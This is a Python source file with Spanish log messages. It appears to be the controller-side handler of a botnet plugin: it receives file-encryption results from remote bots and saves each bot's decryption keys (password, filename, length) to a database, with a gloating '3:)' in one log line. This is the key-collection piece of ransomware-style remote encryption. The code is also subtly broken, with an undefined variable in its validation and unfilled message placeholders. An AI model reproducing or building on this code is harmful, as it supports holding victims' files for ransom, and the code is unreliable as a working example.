from utils.UI import evieModule
from utils.UI import debug

def main(result, log, bot_id, function, exception):

    if not (exception == None):

        log.logger('Ocurrio una excepción remota: {}'.format(exception), debug.COM)
        return

    if (function == 'tree_encrypt') or (function == 'encrypt'):

        if (function == 'encrypt'):

            if (isinstance(result, dict)):

                result = [result]

            else:

                if (isinstance(result, list)):

                    if (None in [None for x in result if not (isinstance(x, dict))]):

                        log.logger('¡Algún dato de los resultados no tiene un tipo de dato correcto!', debug.WAR)

                    else:

                        if (None in [None for x in result if (len(x) != 3) or not (isinstance(_.get('password'), str)) or not (isinstance(_.get('filename'), str)) or not (isinstance(_.get('length'), int))]):

                            log.logger('¡Algún dato de los resultados no está siguiendo la especificación acordada!', debug.WAR)

                        else:

                            if (len(result) == 0):

                                log.logger('¡No hay archivos encriptados!', debug.WAR)

                            else:

                                lon = len(result)
                                wrap = evieModule.CreateDatabase('symplix')

                                log.logger('%d Archivos encriptados' % (lon), debug.PER) if (lon > 1) else log.logger('Se encripto un archivo ...', debug.INF)
                                log.logger('Guardando claves de descifrado ...', debug.WAR)

                                if not (bot_id in list(wrap.getall().keys())):

                                    if (wrap.add(bot_id, {'keys':[result]}) == True):

                                        log.logger('Claves de descifrado guardadas con éxito ...', debug.INF)

                                    else:

                                        log.logger('¡Error guardando las claves de descifrado!', debug.COM)

                                else:

                                    log.logger('No es la primera vez que se guardan claves de descifrado 3:)', debug.WAR)

                                    if (wrap.write(bot_id, 'keys', result) == True):

                                        log.logger('Claves de descifrados guardadas con éxito ...', debug.INF)

                                    else:

                                        log.logger('¡Error guardando las claves de descifrado!', debug.COM)

                else:

                    log.logger('El tipo de dato de los resultados del cifrado de los datos no es correcto', debug.WAR)

    elif (function == 'tree_decrypt'):

        if (isinstance(result, int)):

            log.logger('No se desencripto ningún archivo ...', debug.WAR) if (result == 0) else log.logger('%d archivos desencriptados ...', debug.PER) if (result > 1) else log.logger('¡Se desencripto un archivo!', debug.INF)

        else:

            log.logger('¡El tipo de dato de los resultados del descifrado es incorrecto!', debug.WAR)

    elif (function == 'decrypt'):

        log.logger('¡Archivo "{}", desencriptado!', debug.WAR)

    else:

        log.logger('{}, No es una función de este complemento', debug.WAR)
